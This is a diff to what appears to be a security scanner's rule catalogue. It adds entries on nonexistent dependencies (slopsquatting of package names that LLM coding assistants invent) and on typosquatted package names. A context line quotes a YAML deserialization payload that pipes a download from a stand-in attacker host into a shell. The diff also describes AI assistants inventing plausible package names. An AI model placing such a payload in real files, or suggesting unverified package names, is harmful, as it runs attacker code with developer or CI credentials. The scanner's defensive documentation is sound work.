@@ -721,6 +721,34 @@ setup: !!python/object/apply:os.system ["curl https://evil.example/x | sh"]
 # Good — plain data only
 setup: "run npm install"`,
   },
+  DEP001: {
+    summary: "A declared dependency does not exist in its package registry.",
+    whyRisky:
+      "A name that resolves to nothing is a claim anyone can take. LLM coding assistants invent plausible package names, and attackers publish malware under them (slopsquatting). The first install after publication runs the attacker's code.",
+    howExploited:
+      "An assistant suggests `pip install fastapi-mcp-helpers`. The name is unregistered, so an attacker registers it with a malicious install hook. The next `pip install -r requirements.txt` runs it with your developer or CI credentials.",
+    howToFix:
+      "Check the spelling and replace the entry with a maintained package you have looked up yourself. Remove it if nothing depends on it. This check needs network access, so it runs only with --check-dependencies, and a failed registry lookup never produces a finding.",
+    codeExample: `# Bad — name was never published (hallucinated or mistyped)
+fastapi-mcp-helpers==1.0.0
+
+# Good — a package you have looked up and verified
+fastapi==0.115.0`,
+  },
+  DEP002: {
+    summary: "A declared dependency has a name one edit away from a popular package.",
+    whyRisky:
+      "Typosquats rely on a small slip in a name. This is a weak signal: many legitimate packages have similar names, so it is reported at heuristic evidence only.",
+    howExploited:
+      "`reqeusts` is published with the real package's API plus a payload that reads environment variables on import. A one-letter typo in a manifest installs it.",
+    howToFix:
+      "Confirm the name against the project's own documentation and check the publisher on the registry. Pin the exact version once verified. Opt-in via --check-dependencies, and shown only with --paranoid.",
+    codeExample: `# Bad — one letter off the real package
+reqeusts==2.32.3
+
+# Good — the name from the project's documentation
+requests==2.32.3`,
+  },
   DEP003: {
     summary: "A dependency has a documented malicious release or critical CVE.",
     whyRisky:
